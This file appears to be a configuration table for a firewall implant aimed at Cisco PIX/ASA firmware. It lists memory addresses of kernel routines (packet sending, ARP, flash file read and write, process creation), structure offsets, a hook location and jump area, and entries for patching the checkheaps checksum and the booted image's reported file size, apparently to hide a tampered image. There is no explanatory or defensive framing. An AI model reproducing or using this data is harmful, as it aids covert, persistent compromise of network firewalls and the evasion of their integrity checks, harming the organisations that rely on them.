; --- SECTION I ---
;
0x40082300            // pix version
0x212f000             // address of implant configuration
0x0   0x08ab5f10      // allocb
0x1   0x08ab58c0      // freeb
0x2   0x08066c30      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x08525730      // ip_put
0x4   0x08066d90      // close
0x5   0x092d8720      // atoip
0x6   0x093199dc      // memset
0x7   0x092fbf10      // memmove
0x8   0x092fb6b0      // malloc_call_calloc
0x9   0x092fb4d0      // free
0xa   0x08065f80      // kprintf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x00000094      // metaframe offset in block structure
0xe   0x00000078      // interface semiphore in metaframe
0xf   0x092fd880      // rand
0x15  0x08063540      // process_create
0x16  0x080649a0      // process_suspend
0x17  0x08064f80      // process_sleep_for
0x18  0x088daad0      // show_process
0x19  0xffffff5c      // offset to security level in int_struct
0x1a  0x00000000      // cur_t
0x1b  0x04            // channel offset in interface struct
0x1c  0x0c            // PUT offset in channel struct
0x1d  0x24            // offset to dest mac in arp structure
0x1e  0x10            // offset to next hop ip in route structure
0x1f  0x20            // size of route struct
0x20  0x08526890      // calc_ip_cksum
0x21  0x08527360      // arp_loopkup
0x22  0x08525d50      // set_block_hdr_mac_and_proto
0x23  0x08537940      // get hardware interface
0x24  0x08851330      // get next hop
0x25  0x088515f0      // get route
0x26  0x08521a90      // send_it
0x27  0x08529c20      // arp_create
0x28  0x08935d30      // get_hw_iface_2
0x2a  0x64            // pointer to ethernet frame
0x2b  0x5c            // wptr structure offset
0x2c  0x44            // inIfc (incoming interface) structure offset
0x2e  0x000001ac      // offset from cur_t that contains the current context number
0x2f  0x09e43ec0      // pointer to channnel list
0x30  0x09e33910      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000018      // offset to IP address in int_struct
0x33  0x00000128      // iface struct adjust from metaframe
0x34  0x09e51cb4      // max number of interface cards
0x35  0x09f6e0a8      // internal_clock
0x36  0x08933de0      // get_interface_mac
0x37  0x000000df      // offset to hardware interface number in interface struct
0x38  0x10            // offset to ip in route structure
0x39  0x00            // offset to interface num in route structure
0x3a  0x00000424      // offset to send channel in channel list
0x3b  0x0847a730      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x0847a810      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x08479d70      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x0847a650      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000040      // offset to next IP fragment pointer in block
0x40  0x09f934c0      // address of context list
0x42  0x09317060      // checkheaps checksum location
0x43  0x08514da0      // get booted image's filename
0x44  0x083acc1f      // fix image size hook point
0x45  0x01c89784      // clean image file size
0x46  0xffffffff      // asa fix image size hook point
0x47  0x2c            // offset to filesize in file info struct
0x52  0x0855c870      // ipv6_encap
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation              0x0870dc3b      // address of our hook point
HookedCall                0x087121d0      // called function being hooked
JmpLocation               0x091eed7a      // empty area to jump to
InterfaceAddr             0x09e33910      // same as 0x30 above
InterfaceLeng             0x000001a4      // length of interface struct
IntSecurityOffset         0xffffff5c            // security level field offset
IntNameOffset             0x00000174      // interface name field offset
IntNumOffset              0x000000df      // interface number field offset
IntVlanOffset             0x10            // same as 0xc above
IntIPOffset               0x18            // ip address offset in the interface struct
IntNetmaskOffset          0x1c            // netmask in the iface struct
FlashClassAddr            0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr          0xffffffff      // addr of crypto structure
ArpTableAddrPtr           0x0998a7fc      // addr of first entry in ARP table
